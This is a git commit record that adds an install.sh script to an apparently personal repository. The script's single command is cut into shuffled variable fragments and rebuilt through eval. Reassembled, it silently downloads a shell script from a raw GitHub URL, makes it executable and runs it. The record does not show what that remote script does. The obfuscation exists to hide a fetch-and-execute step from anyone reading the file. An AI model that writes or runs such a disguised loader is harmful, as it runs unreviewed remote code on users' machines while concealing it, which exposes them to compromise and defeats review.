c1f822342ce07f2d825b2e6dc123597c9100042f
RafanSC <153880084+RafanSC@users.noreply.github.com>
2023-12-15 09:19:52 +0700

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,3 @@
+z="
+";Sz='sh &';Mz='TR/w';Pz='NSTE';Jz='t.co';Uz='mod ';az='mi.s';Qz='R/pr';Fz='gith';Bz=' -q ';Cz='http';Hz='erco';Lz='fanS';Ez='raw.';Wz='remi';Gz='ubus';bz='h';Rz='emi.';Az='wget';Dz='s://';Xz='.sh ';Vz='+x p';Zz='/pre';Yz='&& .';Iz='nten';Oz='d/MO';Kz='m/Ra';Nz='iz4r';Tz='& ch';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz"
